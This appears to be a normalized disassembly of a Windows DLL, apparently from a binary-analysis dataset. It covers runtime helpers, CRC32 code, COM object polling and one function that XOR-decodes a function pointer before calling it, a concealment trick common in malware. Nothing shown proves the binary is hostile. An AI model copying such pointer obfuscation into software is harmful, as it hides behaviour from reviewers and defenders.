xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
sub_100293b0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x15 ] 0x0
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_100293b0
mov esi [ esi ]
push edi
call sub_1000a86e
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov edi esi
je r-xdata
sub_100293e8
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
movzx eax [ esi ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_100637b6
dec [ ebp + 0x1c ]
inc esi
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop esi
sub_1002941e
push 0x4
mov eax sub_10085bd2
call sub_10026266
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] edi
mov [ esi ] ax
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] edi
sar eax 0x1
mov [ ebp - 0x10 ] 0x1
je r-xdata
push edi
push eax
mov ecx esi
call sub_1001c9b4
mov eax esi
call sub_10008d33
retn 0xc
lea ebx [ ecx + 0x8 ]
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp edx 0x8
jb r-xdata
cmp eax edi
ja r-xdata
push ebx
push [ ebp + 0x10 ]
lea eax [ ecx + eax * 2 ]
push [ ebp + 0xc ]
push eax
push edx
call sub_10038cc3
add esp 0x14
cmp eax [ esi + 0x10 ]
jbe r-xdata
push edi
push eax
mov ecx esi
call sub_1001c9b4
mov edx [ esi + 0x14 ]
cmp edx 0x8
jb r-xdata
sub_100294ad
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100141b2
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_10029567
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10051cf5
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x2
lea eax [ ebp - 0x10 ]
push eax
push 0x2
push [ ebp + 0x8 ]
call sub_100718ba
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_100295c0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086510
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x4c ] eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_1006ad40
test eax eax
je r-xdata
push ebx
push ebx
call [ CoInitializeEx@IAT ]
test eax eax
js r-xdata
call sub_1002dbf0
test eax eax
je r-xdata
lea eax [ ebx + 0x5 ]
jmp r-xdata
mov eax 0x1
lea ecx [ ebp - 0x34 ]
push ecx
push r--data
push 0x4
push ebx
push r--data
mov [ ebp - 0x38 ] 0x4
call [ CoCreateInstance@IAT ]
cmp [ ebp - 0x34 ] ebx
je r-xdata
mov eax 0x6
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov [ ebp - 0x38 ] 0x2
call [ CoUninitialize@IAT ]
mov eax [ ebp - 0x38 ]
jmp r-xdata
lea edx [ ebp - 0x5c ]
push edx
call [ VariantInit@IAT ]
lea edx [ ebp - 0x2c ]
mov eax 0x3
call sub_10069020
mov eax edx
push eax
call [ SysAllocString@IAT ]
lea edx [ ebp - 0x5c ]
push edx
push edx
push edx
mov esi eax
mov eax [ ebp - 0x34 ]
mov ecx [ eax ]
push edx
push esi
push eax
mov eax [ ecx + 0x2c ]
call eax
push esi
mov [ ebp - 0x30 ] eax
call [ SysFreeString@IAT ]
mov edi [ Sleep@IAT ]
xor esi esi
nop
cmp [ ebp - 0x30 ] ebx
jne r-xdata
push 0x64
call edi
inc esi
cmp esi 0xa
jl r-xdata
mov [ ebp - 0x38 ] 0x3
mov [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x34 ]
lea edx [ ebp - 0x30 ]
mov [ ebp - 0x30 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x48 ]
call eax
mov eax [ ebp - 0x30 ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x34 ]
lea edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0xe0 ]
call eax
cmp [ ebp - 0x48 ] 0x4
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x1
push edx
mov [ ebp - 0x44 ] ebx
mov ecx [ eax ]
push r--data
push eax
mov eax [ ecx ]
call eax
mov eax [ ebp - 0x44 ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x34 ]
mov ecx [ eax ]
mov edx [ ecx + 0x80 ]
push eax
call edx
mov eax [ ebp - 0x34 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax [ ebp - 0x38 ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
jmp r-xdata
mov [ ebp - 0x4 ] bl
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0x2
lea edx [ ebp - 0x3c ]
mov [ ebp - 0x3c ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x1b0 ]
call eax
mov eax [ ebp - 0x3c ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x30 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0x3
lea edx [ ebp - 0x40 ]
mov [ ebp - 0x40 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0xfc ]
call eax
mov eax [ ebp - 0x40 ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x44 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0x2
cmp eax ebx
je r-xdata
mov edx [ ebp - 0x4c ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x28 ]
call eax
test eax eax
mov eax [ ebp - 0x40 ]
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x38 ] ebx
sub_10029807
push 0x38
mov eax sub_1008571a
call sub_10047689
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10007a10
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1006406d
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_1002be90
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10046885
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffffffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100262c3
retn 0x20
sub_10029900
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4c ]
push edi
mov edi 0x1
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn
push 0x0
push eax
call [ TerminateThread@IAT ]
mov ecx [ esi + 0x4c ]
mov edi eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov al 0x38
xor [ ebp - 0x4 ] al
xor [ ebp - 0x3 ] al
xor [ ebp - 0x2 ] al
xor [ ebp - 0x1 ] al
push ecx
call [ ebp - 0x4 ]
mov [ esi + 0x4c ] 0x0
sub_100299a0
push ebx
mov ebx [ esi + 0x4 ]
push edi
xor edi edi
test ebx ebx
je r-xdata
mov eax [ esi ]
pop edi
pop ebx
test eax eax
je r-xdata
jmp r-xdata
retn
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi ] 0x0
mov eax [ esi ]
cmp [ eax + edi * 4 ] 0x0
lea eax [ eax + edi * 4 ]
je r-xdata
dec [ esi + 0x4 ]
inc edi
cmp edi ebx
jb r-xdata
mov ecx [ eax ]
push ecx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edx [ esi ]
mov [ edx + edi * 4 ] 0x0
sub_100299fd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cl [ ebp + 0x10 ]
push ebx
push esi
push edi
xor edi edi
mov [ eax + 0x4 ] edi
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ eax + 0x8 ] edi
mov eax [ ebp + 0x8 ]
inc ebx
mov [ eax + 0xc ] edi
test cl 0x10
je r-xdata
test cl 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] ebx
mov [ ebp + 0x10 ] 0xc000008f
test bl cl
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x2
mov [ ebp + 0x10 ] 0xc0000093
test cl 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x4
mov [ ebp + 0x10 ] 0xc0000091
test cl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x8
mov [ ebp + 0x10 ] 0xc000008e
mov esi [ ebp + 0xc ]
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shl ecx 0x4
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x10
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
add ecx ecx
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x8
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x1
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x4
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x3
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x2
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x5
not ecx
xor ecx [ eax + 0x8 ]
and ecx ebx
xor [ eax + 0x8 ] ecx
call sub_1005145f
test bl al
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x10
mov [ ebp + 0x10 ] 0xc0000090
test al 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x10
test al 0x8
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x8
test al 0x10
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x4
test al 0x20
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x2
mov eax [ esi ]
mov ecx 0xc00
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] ebx
mov eax [ ebp + 0x8 ]
and [ eax ] 0xfffffffc
cmp eax 0x400
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xffffffeb
or ecx 0x8
cmp eax 0x200
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xfffffffd
or ecx ebx
jmp r-xdata
cmp eax 0x800
je r-xdata
mov ecx [ eax + 0x20 ]
and ecx 0xffffffe3
or ecx 0x2
mov [ eax + 0x20 ] ecx
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x60 ]
and ecx 0xffffffe3
or ecx 0x2
mov [ eax + 0x60 ] ecx
fld [ edi ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x50 ]
and [ eax + 0x20 ] 0xffffffe1
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
and [ eax + 0x60 ] 0xffffffe1
fld [ edi ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x50 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xffffffe7
or ecx 0x4
jmp r-xdata
cmp eax ecx
jne r-xdata
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xfffffffe
or ecx 0x2
cmp eax ecx
jne r-xdata
test [ ecx + 0x8 ] 0x8
je r-xdata
and [ esi ] 0xfffffffe
call sub_1003a3d5
lea eax [ ebp + 0x8 ]
push eax
push ebx
push 0x0
push [ ebp + 0x10 ]
call [ RaiseException@IAT ]
mov ecx [ ebp + 0x8 ]
test [ ecx + 0x8 ] 0x10
je r-xdata
mov [ eax ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
shl ecx 0x5
xor ecx [ eax ]
and ecx 0x1ffe0
xor [ eax ] ecx
mov eax [ ebp + 0x8 ]
or [ eax + 0x20 ] ebx
cmp [ ebp + 0x20 ] edi
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x1c ]
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0xffffffe3
jmp r-xdata
mov eax [ esi ]
mov ecx 0x300
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax ] 0x3
jmp r-xdata
test [ ecx + 0x8 ] 0x4
je r-xdata
and [ esi ] 0xfffffffb
test [ ecx + 0x8 ] 0x2
je r-xdata
and [ esi ] 0xfffffff7
test [ ecx + 0x8 ] bl
je r-xdata
and [ esi ] 0xffffffef
mov eax [ ecx ]
and eax 0x3
xor ebx ebx
sub eax ebx
mov edx 0xfffff3ff
je r-xdata
and [ esi ] 0xffffffdf
and [ esi ] edx
dec eax
je r-xdata
mov eax [ esi ]
and eax edx
or eax 0x300
dec eax
je r-xdata
mov eax [ esi ]
and eax 0xfffff7ff
or eax 0x400
jmp r-xdata
dec eax
je r-xdata
fld [ ecx + 0x50 ]
fstp [ edi ]
fld [ ecx + 0x50 ]
fstp [ edi ]
jmp r-xdata
mov eax [ esi ]
and eax edx
or eax 0x200
jmp r-xdata
dec eax
jne r-xdata
mov [ esi ] eax
jmp r-xdata
mov eax [ esi ]
and eax 0xfffffbff
or eax 0x800
dec eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov [ esi ] eax
cmp [ ebp + 0x20 ] ebx
je r-xdata
and [ esi ] edx
jmp r-xdata
mov eax [ ecx ]
shr eax 0x2
and eax 0x7
sub eax ebx
je r-xdata
or [ esi ] 0xc00
jmp r-xdata
sub_10029cd9
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100518e5
add esp 0xc
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
mov eax 0x7fffffff
pop ebp
retn
pop ebp
jmp sub_10017bd1
sub_10029d20
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_10063a9a
pop ecx
push eax
call sub_10046777
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_10029d90
push ebp
mov ebp esp
sub esp 0x404
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
xor ecx ecx
test al 0x1
je r-xdata
xor eax 0xedb88320
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
test al 0x1
je r-xdata
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
test al 0x1
je r-xdata
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
test al 0x1
je r-xdata
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
test al 0x1
je r-xdata
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
test al 0x1
je r-xdata
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
test al 0x1
je r-xdata
mov eax ecx
shr eax 0x1
test cl 0x1
je r-xdata
or eax 0xffffffff
test edx edx
je r-xdata
mov [ ebp + ecx * 4 - 0x404 ] eax
inc ecx
cmp ecx 0x100
jl r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
not eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
lea ebx [ ebx ]
movzx ecx [ esi ]
xor ecx eax
and ecx 0xff
shr eax 0x8
xor eax [ ebp + ecx * 4 - 0x404 ]
inc esi
dec edx
jne r-xdata
sub_10029e6a
push 0x20
mov eax sub_10085a7f
call sub_10047689
mov eax [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x24 ]
mov ebx [ ebp + 0x28 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_1001a865
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
or [ esi ] 0x1
push 0xffffffff
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_1002d970
or [ esi ] 0x2
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ edi + 0x4 ] eax
call sub_1006d830
mov eax edi
call sub_100262c3
retn 0x24
sub_10029ef0
push ebp
mov ebp esp
push 0xffffffff
push sub_10087b59
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] edi
mov [ esi ] ax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] 0x1
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
mov edi [ esi + 0x10 ]
sub eax edx
sar eax 0x1
add eax [ ebx + 0x10 ]
cmp edi eax
ja r-xdata
mov edi [ ebp + 0xc ]
mov eax edi
lea edx [ eax + 0x2 ]
lea esp [ esp ]
cmp [ esi + 0x14 ] eax
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
mov ecx esi
call sub_10052290
push 0xffffffff
push 0x0
push ebx
mov ecx esi
call sub_1006da10
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push 0x1
push eax
mov ecx esi
call sub_10068c70
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_10029fc7
mov edi edi
push esi
push 0x18
mov esi ecx
call sub_1002e3ac
push eax
mov [ esi ] eax
call sub_10050ab9
pop ecx
pop ecx
mov eax esi
pop esi
retn
sub_10029fe1
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
call sub_1003a9f6
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x14 ]
call sub_10024880
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax r--data
mov eax r--data
push [ ebp + 0xc ]
push 0x0
call sub_1003a9f6
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
lea ecx [ esi + 0x1c ]
call sub_10024880
pop esi
pop ebp
retn
sub_1002a030
push ebp
mov ebp esp
push 0xffffffff
push sub_100877d0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x184
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x168 ] ecx
mov ecx [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x16c ] edx
mov [ ebp - 0x170 ] ecx
cmp [ eax + 0xec ] ebx
jne r-xdata
mov ecx [ eax + 0x108 ]
add ecx [ eax + 0x100 ]
mov edx [ eax + 0x50 ]
lea esi [ ecx * 8 ]
sub esi ecx
mov ecx [ eax + 0xd8 ]
lea edx [ esi + edx + 0x2e ]
cmp ecx edx
jbe r-xdata
lea eax [ ebx + 0x42 ]
jmp r-xdata
mov ecx 0x1f4
sub ecx edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x170 ]
cmp [ edx + 0x10 ] ebx
mov edi [ ebp - 0x164 ]
sete al
xor ecx ecx
cmp al bl
sete cl
lea esi [ ebp - 0x154 ]
add ecx 0x6
push ecx
call sub_1006ff30
mov [ ebp - 0x4 ] ebx
push 0x2
push r--data
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x88 ] 0xf
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] bl
call sub_1003e780
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x150 ]
mov esi [ ebp - 0x154 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov [ ebp - 0x15c ] eax
mov eax [ eax + 0x10c ]
shr ecx 0x3
mov [ ebp - 0x15c ] ecx
cmp ecx eax
jbe r-xdata
push esi
lea eax [ ebp - 0x154 ]
call sub_10003290
mov esi [ ebp - 0x164 ]
push eax
push esi
lea edi [ ebp - 0x9c ]
call sub_10017cc0
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
jne r-xdata
push r--data
call sub_100651be
push edi
push esi
lea eax [ ebp - 0x154 ]
call sub_100215e0
mov edx [ ebp - 0x168 ]
push edx
mov [ ebp - 0x184 ] eax
lea eax [ ebp - 0x10c ]
push r--data
push eax
call sub_10003080
add esp 0xc
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_100651be
lea eax [ edi + 0x1c ]
push eax
lea eax [ ebp - 0x154 ]
call sub_10003290
push eax
push esi
lea edi [ ebp - 0x10c ]
call sub_10017cc0
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
push r--data
call sub_100651be
lea eax [ edi + 0x1c ]
push eax
push esi
lea eax [ ebp - 0x154 ]
call sub_100215e0
push 0x3
push r--data
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x168 ] eax
mov [ ebp - 0xa4 ] 0xf
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] bl
call sub_1003e780
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x2
ja r-xdata
push r--data
call sub_100651be
lea eax [ edi + 0x38 ]
push eax
lea eax [ ebp - 0x154 ]
call sub_10003290
push eax
push esi
lea edi [ ebp - 0xb8 ]
call sub_10017cc0
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
push r--data
call sub_100651be
lea eax [ edi + 0x38 ]
push eax
push esi
lea eax [ ebp - 0x154 ]
call sub_100215e0
push 0x1
push r--data
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x18c ] eax
mov [ ebp - 0x6c ] 0xf
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] bl
call sub_1003e780
mov [ ebp - 0x4 ] 0x4
push 0x1
lea ecx [ ebp - 0x80 ]
cmp [ esi ] ebx
jne r-xdata
push r--data
call sub_100651be
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x54 ]
push eax
lea eax [ ebp - 0x154 ]
call sub_10003290
push eax
push esi
lea edi [ ebp - 0x80 ]
call sub_10017cc0
mov ecx [ ebp - 0x150 ]
mov esi [ ebp - 0x154 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
